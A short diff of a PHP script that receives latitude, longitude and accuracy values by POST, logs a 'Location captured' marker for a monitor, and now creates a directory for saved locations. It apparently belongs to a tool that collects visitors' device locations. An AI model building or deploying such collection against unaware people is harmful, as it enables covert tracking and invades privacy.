@@ -5,7 +5,12 @@ $longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
 $accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
 
 if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
-    // Create a marker file with minimal information
+    // Ensure directories exist
+    if (!is_dir('saved_locations')) {
+        @mkdir('saved_locations', 0755, true);
+    }
+    
+    // Create a marker file for the monitor
     file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
     
     $data = "Latitude: " . $latitude . "\r\n" .
